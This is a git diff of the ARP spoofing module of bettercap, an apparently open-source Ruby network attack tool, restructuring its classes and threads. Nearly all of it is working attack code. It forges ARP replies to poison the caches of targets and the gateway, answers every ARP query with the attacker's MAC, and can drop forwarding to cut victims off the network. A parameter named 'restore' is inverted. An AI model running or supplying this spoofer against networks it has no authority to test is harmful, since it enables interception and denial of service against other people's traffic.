@@ -1,3 +1,4 @@
+# encoding: UTF-8
 =begin
 
 BETTERCAP
@@ -9,33 +10,29 @@ Blog   : http://www.evilsocket.net/
 This project is released under the GPL 3 license.
 
 =end
-require 'bettercap/error'
-require 'bettercap/context'
-require 'bettercap/base/ispoofer'
-require 'bettercap/network'
-require 'bettercap/logger'
-require 'colorize'
+require 'bettercap/spoofers/base'
 
-class ArpSpoofer < ISpoofer
+module BetterCap
+module Spoofers
+# This class is responsible of performing ARP spoofing on the network.
+class Arp < Base
+  # Initialize the BetterCap::Spoofers::Arp object.
   def initialize
     @ctx          = Context.get
-    @gw_hw        = nil
+    @gateway      = nil
     @forwarding   = @ctx.firewall.forwarding_enabled?
     @spoof_thread = nil
+    @sniff_thread = nil
+    @capture      = nil
     @running      = false
 
-    Logger.debug 'ARP SPOOFER SELECTED'
-
-    Logger.info "Getting gateway #{@ctx.gateway} MAC address ..."
-    @gw_hw = Network.get_hw_address( @ctx.iface, @ctx.gateway )
-    if @gw_hw.nil?
-      raise BetterCap::Error, "Couldn't determine router MAC"
-    end
-
-    Logger.info "  Gateway : #{@ctx.gateway} ( #{@gw_hw} )"
+    update_gateway!
   end
 
-  def send_spoofed_packed( saddr, smac, daddr, dmac )
+  # Send a spoofed ARP reply to the target identified by the +daddr+ IP address
+  # and +dmac+ MAC address, spoofing the +saddr+ IP address and +smac+ MAC
+  # address as the source device.
+  def send_spoofed_packet( saddr, smac, daddr, dmac )
     pkt = PacketFu::ARPPacket.new
     pkt.eth_saddr = smac
     pkt.eth_daddr = dmac
@@ -45,86 +42,93 @@ class ArpSpoofer < ISpoofer
     pkt.arp_daddr_ip = daddr
     pkt.arp_opcode = 2
 
-    pkt.to_w(@ctx.iface[:iface])
+    @ctx.packets.push(pkt)
   end
 
+  # Start the ARP spoofing.
   def start
-    stop() unless @running == false
+    Logger.debug "Starting ARP spoofer ( #{@ctx.options.half_duplex ? 'Half' : 'Full'} Duplex ) ..."
 
-    Logger.info 'Starting ARP spoofer ...'
-
-    if @forwarding == false
-      Logger.debug 'Enabling packet forwarding.'
-
-      @ctx.firewall.enable_forwarding(true)
-    end
-
+    stop() if @running
     @running = true
-    @spoof_thread = Thread.new do
-      prev_size = @ctx.targets.size
-      loop do
-        if not @running
-            Logger.debug 'Stopping spoofing thread ...'
-            Thread.exit
-            break
-        end
 
-        size = @ctx.targets.size
-
-        if size > prev_size
-          Logger.warn "Aquired #{size - prev_size} new targets."
-        elsif size < prev_size
-          Logger.warn "Lost #{prev_size - size} targets."
-        end
-
-        Logger.debug "Spoofing #{@ctx.targets.size} targets ..."
-
-        @ctx.targets.each do |target|
-          # targets could change, update mac addresses if needed
-          if target.mac.nil?
-            Logger.warn "Getting target #{target.ip} MAC address ..."
-
-            hw = Network.get_hw_address( @ctx.iface, target.ip, 1 )
-            if hw.nil?
-              Logger.warn "Couldn't determine target MAC"
-              next
-            else
-              Logger.info "  Target MAC    : #{hw}"
-
-              target.mac = hw
-            end
-          end
-
-          send_spoofed_packed @ctx.gateway,    @ctx.iface[:eth_saddr], target.ip, target.mac
-          send_spoofed_packed target.ip, @ctx.iface[:eth_saddr], @ctx.gateway,    @gw_hw
-        end
-
-        prev_size = @ctx.targets.size
-
-        sleep(1)
-      end
+    if @ctx.options.kill
+      Logger.warn "Disabling packet forwarding."
+      @ctx.firewall.enable_forwarding(false) if @forwarding
+    else
+      @ctx.firewall.enable_forwarding(true) unless @forwarding
     end
+
+    @sniff_thread = Thread.new { arp_watcher }
+    @spoof_thread = Thread.new { arp_spoofer }
   end
 
+  # Stop the ARP spoofing, reset firewall state and restore targets ARP table.
   def stop
     raise 'ARP spoofer is not running' unless @running
 
-    Logger.info 'Stopping ARP spoofer ...'
-
+    Logger.debug 'Stopping ARP spoofer ...'
     Logger.debug "Resetting packet forwarding to #{@forwarding} ..."
     @ctx.firewall.enable_forwarding( @forwarding )
 
     @running = false
-    @spoof_thread.join
+    begin
+      @spoof_thread.exit
+    rescue
+    end
 
-    Logger.info "Restoring ARP table of #{@ctx.targets.size} targets ..."
+    Logger.debug "Restoring ARP table of #{@ctx.targets.size} targets ..."
 
     @ctx.targets.each do |target|
-      if !target.mac.nil?
-        send_spoofed_packed @ctx.gateway,    @gw_hw,     target.ip, target.mac
-        send_spoofed_packed target.ip, target.mac, @ctx.gateway,    @gw_hw
+      unless target.ip.nil? or target.mac.nil?
+        spoof(target)
       end
     end
-    sleep 1
   end
+
+  private
+
+  # Send an ARP spoofing packet to +target+, if +restore+ is true it will
+  # restore its ARP cache instead.
+  def spoof( target, restore = false )
+    if restore
+      send_spoofed_packet( @gateway.ip, @ctx.ifconfig[:eth_saddr], target.ip, target.mac )
+      send_spoofed_packet( target.ip, @ctx.ifconfig[:eth_saddr], @gateway.ip, @gateway.mac ) unless @ctx.options.half_duplex
+    else
+      send_spoofed_packet( @gateway.ip, @gateway.mac, target.ip, target.mac )
+      send_spoofed_packet( target.ip, target.mac, @gateway.ip, @gateway.mac ) unless @ctx.options.half_duplex
+    end
+  end
+
+  # Main spoofer loop.
+  def arp_spoofer
+    spoof_loop(1) { |target|
+      unless target.ip.nil? or target.mac.nil?
+        spoof(target, true)
+      end
+    }
+  end
+
+  # Return true if the +pkt+ packet is an ARP 'who-has' query coming
+  # from some network endpoint.
+  def is_arp_query?(pkt)
+    # we're only interested in 'who-has' packets
+    pkt.arp_opcode == 1 and \
+    pkt.arp_dst_mac.to_s == '00:00:00:00:00:00' and \
+    pkt.arp_src_ip.to_s != @ctx.ifconfig[:ip_saddr]
+  end
+
+  # Will watch for incoming ARP requests and spoof the source address.
+  def arp_watcher
+    Logger.debug 'ARP watcher started ...'
+
+    sniff_packets('arp') { |pkt|
+      if is_arp_query?(pkt)
+        Logger.info "[#{'ARP'.green}] #{pkt.arp_src_ip.to_s} is asking who #{pkt.arp_dst_ip.to_s} is."
+        send_spoofed_packet pkt.arp_dst_ip.to_s, @ctx.ifconfig[:eth_saddr], pkt.arp_src_ip.to_s, pkt.arp_src_mac.to_s
+      end
+    }
+  end
+end
+end
 end
